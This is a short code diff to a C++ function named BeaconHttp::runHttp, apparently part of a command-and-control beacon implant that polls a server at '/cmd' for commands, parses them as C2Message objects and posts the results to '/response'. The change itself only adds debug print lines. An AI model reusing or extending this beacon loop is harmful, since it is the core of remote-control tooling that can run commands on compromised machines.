@@ -30,11 +30,17 @@ int BeaconHttp::runHttp()
 
 		if (auto res = cli.Get("/cmd")) 
 		{
+			std::cout << "get cmd" << std::endl;
 			if (res->status == 200) 
 			{
+
+				std::cout << "status 200" << std::endl;
+
 				cmd = res->body;
 				if (!cmd.empty())
 				{
+					std::cout << "cmd not empty" << std::endl;
+
 					C2Message c2Message;
 					c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
 					C2Message c2RetMessage;
@@ -44,6 +50,8 @@ int BeaconHttp::runHttp()
 					string out;
 					c2RetMessage.SerializeToString(&out);
 					auto res2 = cli.Post("/response", out.data(), out.size(), "test");
+
+					std::cout << "out size" << out.size() << std::endl;
 				}
 			}
 		}
